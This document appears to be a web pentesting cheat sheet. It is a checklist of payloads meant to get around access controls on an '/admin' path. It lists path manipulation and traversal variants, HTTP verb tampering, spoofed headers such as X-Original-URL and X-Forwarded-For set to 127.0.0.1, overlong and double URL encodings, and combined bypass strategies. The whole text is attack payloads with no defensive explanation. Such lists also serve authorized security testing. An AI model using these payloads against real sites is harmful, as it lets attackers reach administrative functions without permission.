
## ▶️ URL Path Manipulation
- [ ] `/admin/`
- [ ] `/..;/admin/`
- [ ] `/admin%2f`
- [ ] `/%2e/admin/`
- [ ] `/admin/.`
- [ ] `/admin%20/`
- [ ] `/admin;/`
- [ ] `/admin//`
- [ ] `/./admin`
- [ ] `/admin?`
- [ ] `/admin#`
- [ ] `/admin/%2e%2e/`
- [ ] `/admin%09/`
- [ ] `/admin%00`
- [ ] `/a͏d͏m͏i͏n/` (Unicode obfuscation)

## HTTP Method/Verb Bypass
- [ ] `GET`
- [ ] `POST`
- [ ] `HEAD`
- [ ] `OPTIONS`
- [ ] `DELETE`
- [ ] `PUT`
- [ ] `PATCH`
- [ ] `TRACE`
- [ ] `MOVE`
- [ ] `CONNECT`

## HTTP Header Bypass Vectors
- [ ] `X-Original-URL: /admin`
- [ ] `X-Custom-IP-Authorization: 127.0.0.1`
- [ ] `X-Forwarded-For: 127.0.0.1`
- [ ] `X-Remote-IP: 127.0.0.1`
- [ ] `X-Originating-IP: 127.0.0.1`
- [ ] `X-Forwarded-Host: internal.example.com`
- [ ] `Forwarded: for=127.0.0.1`
- [ ] `X-HTTP-Method-Override: PUT`
- [ ] `X-Original-Host: localhost`
- [ ] `Host: 127.0.0.1`

## Encoding Tricks
- [ ] `%2e%2e%2f` (double URL-encoded `../`)
- [ ] `%25%32%65` (double-encoded `%2e`)
- [ ] `%c0%ae%c0%ae/` (non-standard UTF-8 encoding)
- [ ] `%e0%80%ae/`
- [ ] `%ef%bc%8f` (Unicode full-width `/`)
- [ ] `\u002e\u002e/`
- [ ] `..%u2215` (Unicode slash)
- [ ] `..\\admin`
- [ ] `..%5Cadmin`
- [ ] `admin%ff`

## Combined Bypass Strategies
- [ ] `POST with X-HTTP-Method-Override: GET`
- [ ] URL + Header combo (`/admin` + `X-Forwarded-For`)
- [ ] Encoded path + internal host header
- [ ] Unicode + Verb Tampering
- [ ] Obfuscated IP headers + custom 404 handling